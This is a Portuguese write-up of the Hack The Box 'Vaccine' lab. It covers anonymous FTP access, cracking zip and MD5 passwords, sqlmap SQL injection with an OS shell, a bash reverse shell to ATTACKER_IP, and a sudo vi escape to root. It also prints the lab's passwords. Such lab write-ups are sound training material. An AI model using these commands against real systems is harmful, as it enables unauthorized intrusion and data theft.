# HTB Starting Point - Vaccine Write-up

## Objetivo

Obter acesso inicial ao sistema através de credenciais expostas em um backup, explorar uma SQL Injection para conseguir execução de comandos, acessar o sistema como `postgres` e escalar privilégios para `root`.

---

## Reconhecimento

Escaneamento inicial:

```bash
nmap -sC -sV -p- TARGET_IP
```

Portas encontradas:

```text
21/tcp  FTP
22/tcp  SSH
80/tcp  HTTP
```

O serviço FTP permitia acesso anônimo.

---

## FTP Enumeration

Conexão ao FTP:

```bash
ftp TARGET_IP
```

Login:

```text
anonymous
anonymous
```

Listagem dos arquivos:

```bash
ls
```

Arquivo encontrado:

```text
backup.zip
```

Download:

```bash
get backup.zip
```

---

## Quebra da senha do ZIP

Gerando hash:

```bash
zip2john backup.zip > hash.txt
```

Quebra com John:

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Senha encontrada:

```text
741852963
```

Extração:

```bash
unzip backup.zip
```

Conteúdo:

```text
index.php
style.css
```

---

## Descoberta de credenciais

Analisando o código:

```php
if($_POST['username'] === 'admin' &&
   md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3")
```

Usuário encontrado:

```text
admin
```

Hash encontrado:

```text
2cb42f8734ea607eefed3b70af13bbd3
```

Quebra do hash:

```bash
echo "2cb42f8734ea607eefed3b70af13bbd3" > md5.txt

john --format=raw-md5 md5.txt \
--wordlist=/usr/share/wordlists/rockyou.txt
```

Senha descoberta:

```text
qwerty789
```

Credenciais válidas:

```text
admin:qwerty789
```

## SQL Injection

Login realizado no painel web.

O parâmetro `search` foi testado com sqlmap:

```bash
sqlmap -u "http://TARGET_IP/dashboard.php?search=test" \
--cookie="PHPSESSID=COOKIE"
```

Resultado:

```text
PostgreSQL
Stacked Queries
Current user is DBA
```

Obtenção de shell:

```bash
sqlmap -u "http://TARGET_IP/dashboard.php?search=test" \
--cookie="PHPSESSID=COOKIE" \
--os-shell
```

---

## Reverse Shell

Listener no Kali:

```bash
nc -lvnp 4444
```

No os-shell:

```bash
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
```

Shell recebida.

Melhoria da shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

Verificação:

```bash
whoami
```

Resultado:

```text
postgres
```

## Flag do usuário

Home do postgres:

```bash
/var/lib/postgresql
```

Leitura da flag:

```bash
cat /var/lib/postgresql/user.txt
```

Primeira flag obtida.

---

## Escalação de privilégios

Verificação de sudo:

```bash
sudo -l
```

Resultado:

```text
User postgres may run the following commands:

(ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

Senha do postgres:

```text
P@s5w0rd!
```

A vulnerabilidade consiste em permitir que o usuário execute o `vi` como root.

Com isso é possível escapar para um shell root ou executar comandos diretamente através do editor.

---

## Flag Root

Após obter execução como root:

```bash
cat /root/root.txt
```

Flag root obtida.
